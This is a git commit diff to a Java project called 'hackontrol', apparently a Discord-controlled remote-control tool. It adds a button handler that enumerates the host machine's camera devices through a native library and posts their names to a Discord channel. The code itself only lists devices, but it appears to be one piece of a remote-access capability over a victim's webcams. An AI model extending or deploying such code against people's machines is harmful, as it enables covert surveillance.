5d4d304ea2e5ce4c4e71a16936a5e894d69c6726
KHOPAN <93379212+KHOPAN@users.noreply.github.com>
2024-05-05 18:33:26 +0700

    Add Basic Camera List

--- src/com/khopan/hackontrol/channel/CameraChannel.java
+++ src/com/khopan/hackontrol/channel/CameraChannel.java
@@ -1,9 +1,12 @@
 package com.khopan.hackontrol.channel;
 
+import com.khopan.hackontrol.CameraDevice;
 import com.khopan.hackontrol.HackontrolChannel;
+import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.registry.Registry;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -13,6 +16,8 @@ public class CameraChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "camera";
 
 	private static final Button CAMERA_LIST_BUTTON = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Camera List", "cameraList");
+
+	private CameraDevice[] devices;
 
 	@Override
 	public String getName() {
@@ -30,6 +35,28 @@ public class CameraChannel extends HackontrolChannel {
 	}
 
 	private void buttonCameraList(ButtonContext context) {
-		context.reply("**Not Implemented**").queue();
+		this.devices = NativeLibrary.cameraList();
+
+		if(this.devices == null || this.devices.length == 0) {
+			HackontrolMessage.deletable(context.reply(), "**No camera available**");
+			return;
+		}
+
+		StringBuilder builder = new StringBuilder();
+
+		for(int i = 0; i < this.devices.length; i++) {
+			if(i > 0) {
+				builder.append('\n');
+			}
+
+			CameraDevice device = this.devices[i];
+			builder.append('`');
+			builder.append(i + 1);
+			builder.append(") ");
+			builder.append(device.getDeviceName());
+			builder.append('`');
+		}
+
+		context.reply(builder.toString()).queue();
 	}
 }
